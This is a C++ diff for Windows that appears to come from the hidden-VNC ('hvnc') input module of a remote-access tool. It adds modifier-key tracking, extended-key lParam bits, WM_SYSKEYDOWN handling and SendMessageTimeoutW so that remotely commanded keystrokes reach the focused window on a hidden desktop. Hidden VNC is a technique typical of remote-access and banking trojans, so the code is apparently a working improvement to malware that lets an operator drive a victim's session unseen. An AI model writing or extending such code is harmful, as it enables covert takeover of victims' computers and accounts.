@@ -144,6 +144,11 @@ static atomic_bool g_inputRunning(false);
 static HWND  g_dragHwnd     = NULL;
 static POINT g_dragStartPt  = {0, 0};
 static POINT g_lastMousePos = {0, 0};
+
+static bool  g_ctrlDown     = false;
+static bool  g_altDown      = false;
+static bool  g_shiftDown    = false;
+
 static RECT  g_dragStartRect = {0, 0, 0, 0};
 static bool  g_dragging     = false;
 static LRESULT g_dragHitTest = HTCLIENT;
@@ -784,10 +789,38 @@ static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData 
     return SendInput(1, &input, sizeof(INPUT)) == 1;
 }
 
-static LPARAM key_lparam(WORD vk, bool keyUp) {
+static bool is_extended_key(WORD vk) {
+    switch (vk) {
+        case VK_RMENU:
+        case VK_RCONTROL:
+        case VK_RSHIFT:
+        case VK_INSERT:
+        case VK_DELETE:
+        case VK_HOME:
+        case VK_END:
+        case VK_PRIOR:
+        case VK_NEXT:
+        case VK_LEFT:
+        case VK_UP:
+        case VK_RIGHT:
+        case VK_DOWN:
+        case VK_DIVIDE:
+        case VK_NUMLOCK:
+            return true;
+    }
+    return false;
+}
+
+static LPARAM key_lparam(WORD vk, bool keyUp, bool altDown) {
     UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
-    LPARAM lp = 1 | (scan << 16);
-    if (keyUp) lp |= 0xC0000000;
+    LPARAM lp = 1; // Repeat count
+    lp |= (scan << 16);
+    if (is_extended_key(vk)) lp |= (1 << 24);
+    if (altDown) lp |= (1 << 29); // Context bit
+    if (keyUp) {
+        lp |= (1 << 30); // Previous key state
+        lp |= (1 << 31); // Transition state
+    }
     return lp;
 }
 
@@ -956,16 +989,44 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = WindowFromPoint(g_lastMousePos);
-            if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
+            HWND hTarget = GetFocusedWindow();
+            if (!hTarget || !IsWindow(hTarget)) hTarget = WindowFromPoint(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) continue;
 
+            bool isMod = (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL ||
+                          vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU ||
+                          vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT);
+
             if (action == "hvnc_keydown") {
-                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
+                if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) g_ctrlDown = true;
+                if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) g_altDown = true;
+                if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) g_shiftDown = true;
+
+                // WM_SYSKEYDOWN is only used when Alt is down WITHOUT Ctrl (to not break AltGr)
+                UINT msg = (g_altDown && !g_ctrlDown || vk == VK_F10) ? WM_SYSKEYDOWN : WM_KEYDOWN;
+                LPARAM lp = key_lparam((WORD)vk, false, g_altDown);
+
+                if (isMod || g_ctrlDown || g_altDown)
+                    SendMessageTimeoutW(hTarget, msg, (WPARAM)vk, lp, SMTO_ABORTIFHUNG, 250, NULL);
+                else
+                    PostMessageW(hTarget, msg, (WPARAM)vk, lp);
             } else if (action == "hvnc_keyup") {
-                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
+                if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) g_ctrlDown = false;
+                if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) g_altDown = false;
+                if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) g_shiftDown = false;
+
+                UINT msg = (g_altDown && !g_ctrlDown || vk == VK_F10) ? WM_SYSKEYUP : WM_KEYUP;
+                LPARAM lp = key_lparam((WORD)vk, true, g_altDown);
+
+                if (isMod || g_ctrlDown || g_altDown)
+                    SendMessageTimeoutW(hTarget, msg, (WPARAM)vk, lp, SMTO_ABORTIFHUNG, 250, NULL);
+                else
+                    PostMessageW(hTarget, msg, (WPARAM)vk, lp);
             } else if (action == "hvnc_char") {
-                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
+                if (g_ctrlDown || g_altDown)
+                    SendMessageTimeoutW(hTarget, WM_CHAR, (WPARAM)vk, 1, SMTO_ABORTIFHUNG, 250, NULL);
+                else
+                    PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
             }
             g_forceFullFrame = true;
             continue;
